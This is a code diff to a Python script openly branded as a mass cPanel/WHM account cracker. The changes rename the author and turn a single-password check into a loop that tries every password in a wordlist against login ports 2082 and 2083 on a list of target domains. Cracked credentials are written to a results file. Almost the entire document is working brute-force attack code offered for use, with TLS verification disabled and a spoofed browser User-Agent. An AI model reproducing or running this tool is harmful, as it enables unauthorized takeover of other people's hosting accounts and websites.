@@ -1,4 +1,4 @@
-# Author: Dimax66
+# Author: FinnSyde
 
 import os
 import re
@@ -31,12 +31,9 @@ def banners():
     stdout.write(""+Fore.LIGHTRED_EX +" ╔╝\n")
     stdout.write(""+Fore.LIGHTRED_EX +"╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝╚═╝ ╚═════╝ \n")
     stdout.write(""+Fore.YELLOW +"═════════════╦═════════════════════════════════╦════════════════════════════════════════════════════════════\n")
-    stdout.write(""+Fore.YELLOW   +"╔════════════╩═════════════════════════════════╩═════════════════════════════╗\n")
-    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   Dimax66                                    "+Fore.YELLOW+"║\n")
-    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB             "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/EscobarPadang                         "+Fore.YELLOW+"║\n")
-    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╝\n")
-    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL FORUM     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   PADANG SYSTEM ERROR                                "+Fore.YELLOW+"║\n")
-    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"OFFICIAL TELEGRAM  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   TELEGRAM.ME/Padangsystemerror                     "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"╔════════════════════════════════════════════════════════════════════════════╗\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"AUTHOR     "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   FINNSYDE                                "+Fore.YELLOW+"║\n")
+    stdout.write(""+Fore.YELLOW   +"║ \x1b[38;2;255;20;147m• "+Fore.GREEN+"GITHUB  "+Fore.RED+"    |"+Fore.LIGHTWHITE_EX+"   GITHUB.COM/Finsii                     "+Fore.YELLOW+"║\n")
     stdout.write(""+Fore.YELLOW   +"╚════════════════════════════════════════════════════════════════════════════╝\n") 
     print(f"{Fore.YELLOW}[cPanel & WHM] - {Fore.GREEN}Perform With Massive cPanel/WHM Account Cracker\n")
 banners()
@@ -85,38 +82,46 @@ def cw(url):
 def c(url, username):
     ports = [2082, 2083]
     ep = "/login/?login_only=1"
-    password = "OUR PASSWORD"
 
-    for port in ports:
-        uwp = f'https://{url}:{port}{ep}'
+    # Baca password dari file lib/test.txt
+    try:
+        with open("lib/test.txt", "r") as file:
+            passwords = [line.strip() for line in file.readlines()]
+    except FileNotFoundError:
+        print("[!] Error: File lib/test.txt tidak ditemukan.")
+        return
 
-        payload = {
-            "user": username,
-            "pass": password,
-            "goto_uri": "/"
-        }
+    for password in passwords:
+        for port in ports:
+            uwp = f'https://{url}:{port}{ep}'
 
-        headers = {
-            'Content-type': 'application/x-www-form-urlencoded',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
-            'Origin': f'https://{url}:{port}',
-            'Referer': f'https://{url}:{port}/',
-            'Connection': 'keep-alive'
-        }
+            payload = {
+                "user": username,
+                "pass": password,
+                "goto_uri": "/"
+            }
 
-        try:
-            response = requests.post(uwp, data=payload, headers=headers, verify=False)
-            response.raise_for_status()
+            headers = {
+                'Content-type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
+                'Origin': f'https://{url}:{port}',
+                'Referer': f'https://{url}:{port}/',
+                'Connection': 'keep-alive'
+            }
 
-            if response.status_code == 200:
-                print(f"{FY}[cPanel/WHM] - {FG}[Cracked!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
-                with open("Results/Cracked.txt", "a") as f:
-                    f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
-            else:
-                print(f"{FY}[cPanel/WHM] - {FR}[Invalid!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
+            try:
+                response = requests.post(uwp, data=payload, headers=headers, verify=False)
+                response.raise_for_status()
 
-        except requests.exceptions.RequestException as e:
-            print(f"{FY}[cPanel/WHM] - {FR}[Bad!] - {FW}https://{url}:{port} - {FC}{username}|{password}")
+                if response.status_code == 200:
+                    print(f"[cPanel/WHM] - [Cracked!] - https://{url}:{port} - {username}|{password}")
+                    with open("Results/Cracked.txt", "a") as f:
+                        f.write(f"[+] URLs: https://{url}:{port}\n[+] Username: {username}\n[+] Password: {password}\n\n")
+                else:
+                    print(f"[cPanel/WHM] - [Invalid!] - https://{url}:{port} - {username}|{password}")
+
+            except requests.exceptions.RequestException:
+                print(f"[cPanel/WHM] - [Bad!] - https://{url}:{port} - {username}|{password}")
 
 
 
@@ -133,7 +138,7 @@ def main():
     w00t = input(f"{FY}DOMAIN/IP LIST: {FW}")
     with open(w00t) as f:
         urls = [line.strip() for line in f]
-    wordlist = input(f"{FY}WORDLIST: {FW}")
+    wordlist = input(f"{FY}WORDLIST/KREDENSIAL: {FW}")
 
     try:
         with open(f"lib/{wordlist}", "r") as file:
